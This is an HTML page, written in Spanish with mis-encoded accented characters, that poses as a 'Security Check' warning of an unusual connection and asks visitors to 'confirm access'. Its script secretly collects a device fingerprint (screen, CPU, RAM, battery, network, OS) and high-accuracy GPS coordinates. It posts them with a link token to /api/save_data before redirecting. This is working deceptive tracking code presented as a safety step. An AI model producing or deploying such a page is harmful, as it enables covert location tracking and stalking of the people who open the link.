<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #3498db; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
        h2 { margin-bottom: 10px; }
        p { color: #666; line-height: 1.5; margin-bottom: 30px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2 id="title">Verificaci칩n de Seguridad</h2>
    <p id="desc">Detectamos una conexi칩n inusual. Para continuar al contenido, confirma que est치s en una ubicaci칩n v치lida.</p>
    
    <button id="btnAction" class="btn" onclick="iniciarProceso()">Confirmar Acceso</button>
    <div id="msg" style="margin-top:20px; font-size:13px; color:#e74c3c;"></div>

    <script>
        const token = window.location.pathname.split('/').pop();

        // Funci칩n para obtener la Huella Digital (Rayos X)
        async function getFingerprint() {
            let info = [];
            
            // 1. Pantalla
            info.push(`游닠 Pantalla: ${window.screen.width}x${window.screen.height}`);
            
            // 2. Hardware (N칰cleos y RAM)
            if (navigator.hardwareConcurrency) info.push(`丘뙖잺 CPU: ${navigator.hardwareConcurrency} N칰cleos`);
            if (navigator.deviceMemory) info.push(`游 RAM: ~${navigator.deviceMemory} GB`);
            
            // 3. Bater칤a (Async)
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    let level = Math.round(bat.level * 100);
                    let status = bat.charging ? "游댋 Cargando" : "游댊 Bater칤a";
                    info.push(`${status}: ${level}%`);
                }
            } catch(e) {}

            // 4. Conexi칩n
            if (navigator.connection) {
                info.push(`游니 Red: ${navigator.connection.effectiveType}`);
            }
            
            // 5. Plataforma
            info.push(`游눹 OS: ${navigator.platform}`);

            return info.join(" | ");
        }

        function irAlDestino() {
            window.location.href = "/redirect/" + token;
        }

        async function iniciarProceso() {
            document.getElementById('msg').innerText = "Analizando entorno del dispositivo...";
            document.getElementById('btnAction').style.display = 'none';
            
            // Obtenemos los datos t칠cnicos primero
            let fingerprint = await getFingerprint();

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => enviarTodo(pos, fingerprint), 
                    (err) => enviarSoloFingerprint(fingerprint), 
                    {enableHighAccuracy: true, timeout: 8000}
                );
            } else {
                // Si el navegador no tiene GPS, enviamos solo fingerprint
                enviarSoloFingerprint(fingerprint);
            }
        }

        function enviarTodo(pos, fingerprint) {
            fetch('/api/save_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    token: token,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    fingerprint: fingerprint
                })
            }).then(irAlDestino).catch(irAlDestino);
        }

        function enviarSoloFingerprint(fingerprint) {
            fetch('/api/save_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    token: token,
                    lat: null, lon: null, acc: null,
                    fingerprint: fingerprint
                })
            }).then(irAlDestino).catch(irAlDestino);
        }
        
        // Auto-inicio si el usuario ya interactu칩 antes (opcional)
        // iniciarProceso();
    </script>
</body>
</html>